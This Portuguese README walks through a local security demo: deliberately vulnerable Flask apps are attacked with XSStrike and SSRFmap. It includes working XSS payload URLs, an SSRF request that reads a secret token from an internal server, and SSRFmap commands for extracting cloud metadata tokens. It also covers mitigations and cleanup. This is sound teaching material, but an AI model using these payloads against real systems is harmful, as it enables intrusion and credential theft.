# README — Demo XSS & SSRF (execução rápida)

**Resumo:** instruções rápidas e copy&paste para executar a demo de **XSS** (XSStrike) e **SSRF** (SSRFmap) localmente.  
**Estrutura esperada:** pedro-luca/src/xss_demo e pedro-luca/src/ssrf_demo.  
**AVISO:** rode apenas em ambiente controlado/local. Nunca escaneie alvos sem autorização.

---

## Pré-requisitos (uma vez)

No terminal (na pasta pedro-luca/src):

```bash
# entre na raiz do projeto
cd ~/pedro-luca/src

# criar e ativar virtualenv (faça isto uma vez)
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install flask requests
Ative o venv em cada terminal onde executar comandos Python:

bash
source ~/pedro-luca/src/venv/bin/activate
XSS Demo (passo-a-passo)
Terminal 1 — rodar a app Flask (vulnerável)
bash
cd ~/pedro-luca/src/xss_demo
source ~/pedro-luca/src/venv/bin/activate
python app.py
Aguarde: * Running on http://127.0.0.1:5000/

Terminal 2 — instalar XSStrike e rodar scanner
bash
cd ~/pedro-luca/src/xss_demo
source ~/pedro-luca/src/venv/bin/activate
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt

# modo interativo
python3 xsstrike.py -u "http://127.0.0.1:5000/?q=test"

# ou modo automático (aceita prompts 'y'):
yes y | python3 xsstrike.py -u "http://127.0.0.1:5000/?q=test"
Testes manuais (cole no navegador)
confirm(1):

text
http://127.0.0.1:5000/?q=%22%3E%3Csvg%20onload%3Dconfirm(1)%3E
mudar background:

text
http://127.0.0.1:5000/?q=%22%3E%3Csvg%20onload%3Ddocument.body.style.background%3D%27red%27%3E
Demonstrar: aparece confirm e/ou fundo vermelho → XSS confirmado.

Mitigação (aplicar depois): usar {{ q }} no template e reiniciar Flask.

SSRF Demo (passo-a-passo, mínimo e reproduzível)
Arquivos esperados em ssrf_demo: app.py, internal_server.py, metadata_server.py, request_single.txt (já criados).

Terminal A — app Flask (vulnerável)
bash
cd ~/pedro-luca/src/ssrf_demo
source ~/pedro-luca/src/venv/bin/activate
python app.py
Aguarde: * Running on http://127.0.0.1:5000/

Terminal B — servidor interno simulado (porta 8001)
bash
cd ~/pedro-luca/src/ssrf_demo
python3 internal_server.py
Aguarde: Internal server running on http://127.0.0.1:8001/

Teste rápido (Terminal C):
bash
curl -i "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:8001/"
# deve retornar SECRET_TOKEN=super_secret_value no HTML
(Opcional para SSRFmap) Mapear metadata e rodar metadata server
Se for demonstrar SSRFmap lendo metadata.google.internal, execute (uma vez; pedirá sudo):

bash
# adicionar hosts
echo "127.0.0.1 metadata.google.internal" | sudo tee -a /etc/hosts

# iniciar servidor que responde em porta 80 com token (precisa sudo)
cd ~/pedro-luca/src/ssrf_demo
sudo python3 metadata_server.py
# deixar este terminal aberto
Terminal C — SSRFmap (execução focada)
bash
cd ~/pedro-luca/src/ssrf_demo/SSRFmap
# comando focado (usa request_single.txt que aponta para 127.0.0.1:8001)
yes y | python3 ssrfmap.py -r request_single.txt -p url -m gce --level 1 --logfile ssrfmap_gce_local.log 2>&1 | tee ssrfmap_gce_local_output.txt
Observação: yes y | auto-responde prompts; -m gce foca no módulo de metadata; --level 1 é menos ruidoso.

Verificar resultado (Terminal C)
bash
ls -la 127.0.0.1_5000*
sed -n '1,200p' 127.0.0.1_5000/token
# ou procurar no log de saída
grep -n "SECRET_TOKEN" ssrfmap_gce_local_output.txt || tail -n 200 ssrfmap_gce_local_output.txt
Se o token aparecer em 127.0.0.1_5000/token ou no log, o SSRFmap automatizou a descoberta.

Mitigação: sobrescrever app.py para aplicar whitelist de hosts; reiniciar Flask e mostrar curl retornando 403 Forbidden.

Mitigação rápida (aplicar depois da demo)
Substitua app.py por versão que valida host (whitelist) e reinicie Flask. Exemplo de comportamento: curl que antes retornava SECRET_TOKEN deve agora retornar 403 Forbidden.

Limpeza (após demo)
bash
# parar servidores: CTRL+C nas janelas
# remover entrada no hosts (se adicionou)
sudo sed -i '/metadata.google.internal/d' /etc/hosts

# limpar arquivos do SSRFmap
cd ~/pedro-luca/src/ssrf_demo/SSRFmap
rm -f ssrfmap_gce_local_output.txt ssrfmap_gce_local.log ssrfmap_single_output.txt SSRFmap.log
rm -rf 127.0.0.1_5000*